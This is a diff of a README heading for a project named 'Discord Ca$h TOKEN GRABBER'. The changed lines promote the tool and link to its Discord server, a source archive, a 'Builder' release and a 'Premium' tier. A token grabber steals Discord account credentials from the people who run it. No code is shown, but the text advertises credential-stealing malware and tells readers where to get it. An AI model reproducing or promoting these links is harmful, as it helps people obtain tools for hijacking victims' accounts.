@@ -1,4 +1,4 @@
-## Discord Ca$h TOKEN GRABBER,
+### Discord Ca$h TOKEN GRABBER,
 
 ## ``-`` [Discord Link](https://discord.gg/Sh236kfpvK) ``-`` [Source](https://github.com/C2Sh/Discord-Ca-h-TOKEN-GRABBER/archive/refs/heads/main.zip) ``-`` [Builder](https://github.com/C2Sh/Discord-Ca-h-TOKEN-GRABBER/releases/tag/Builder) ``-`` [Premium](https://discord.gg/Sh236kfpvK) ``-`` [Features](https://github.com/C2Sh/Discord-Ca-h-TOKEN-GRABBER#features)
 
